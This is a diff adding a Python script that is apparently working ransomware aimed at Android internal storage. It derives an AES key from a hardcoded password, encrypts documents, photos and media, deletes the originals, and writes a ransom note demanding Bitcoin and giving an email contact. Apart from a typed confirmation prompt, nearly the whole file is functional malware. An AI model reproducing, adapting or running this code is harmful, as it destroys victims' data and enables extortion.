@@ -1,0 +1,88 @@
+import os
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+
+# Configuration
+PASSWORD = "themaskedwhisperer"
+TARGET_PATH = "/storage/emulated"  # Dangerous path! (Android internal storage)
+TARGET_EXTENSIONS = ['.txt', '.jpg', '.jpeg', '.png', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.mp3', '.mp4', '.mov']
+SALT = b'\xa4\x0b\xf8\x2d\x99\xe6\x41\x8c'  # Fixed salt (in real ransomware, this might be random per file or per run)
+
+# Safety checks - to prevent accidental execution
+if not os.path.exists(TARGET_PATH):
+    print(f"Target path {TARGET_PATH} does not exist. Exiting.")
+    exit(1)
+
+confirmation = input(f"WARNING: This will encrypt all files in {TARGET_PATH}. Type 'YES_DO_IT' to proceed: ")
+if confirmation != "YES_DO_IT":
+    print("Aborted.")
+    exit(0)
+
+def derive_key(password, salt):
+    return PBKDF2(password, salt, dkLen=32, count=100000)
+
+def encrypt_file(key, file_path):
+    # Generate a random IV
+    iv = get_random_bytes(AES.block_size)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+
+    # Read the file
+    with open(file_path, 'rb') as f:
+        plaintext = f.read()
+
+    # Pad the plaintext according to PKCS#7
+    pad_len = AES.block_size - (len(plaintext) % AES.block_size)
+    plaintext_padded = plaintext + bytes([pad_len] * pad_len)
+
+    # Encrypt
+    ciphertext = cipher.encrypt(plaintext_padded)
+
+    # Write the encrypted file (appending .encrypted)
+    with open(file_path + ".encrypted", 'wb') as f:
+        f.write(iv)
+        f.write(ciphertext)
+
+    # Remove the original file
+    os.remove(file_path)
+
+def create_ransom_note(directory):
+    note = f"""ATTENTION!
+
+Your files have been encrypted using military-grade AES-256 encryption.
+
+The only way to recover your files is to purchase the decryption key.
+To do so, send 0.5 Bitcoin (BTC) to the following address:
+
+    bc1qthemaskedwhisperer0x0x0x0x0x0x0x0x0x0x0x
+
+After payment, email your transaction ID and this device's unique ID to:
+    themaskedwhisperer@protonmail.com
+
+Your decryption password is: {PASSWORD}
+But note: without the decryption software and the unique key derived from the password, you cannot recover your files.
+
+WARNING: Do NOT attempt to decrypt without the software. You may cause permanent data loss.
+"""
+    note_path = os.path.join(directory, "READ_ME_FOR_DECRYPT.txt")
+    with open(note_path, 'w') as f:
+        f.write(note)
+
+# Main encryption process
+key = derive_key(PASSWORD, SALT)
+create_ransom_note(TARGET_PATH)
+
+file_count = 0
+for root, dirs, files in os.walk(TARGET_PATH):
+    for file in files:
+        if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
+            file_path = os.path.join(root, file)
+            try:
+                encrypt_file(key, file_path)
+                file_count += 1
+                print(f"Encrypted: {file_path}")
+            except Exception as e:
+                print(f"Failed to encrypt {file_path}: {str(e)}")
+
+print(f"\nEncryption complete. {file_count} files encrypted.")
+print(f"Ransom note placed in {TARGET_PATH}")
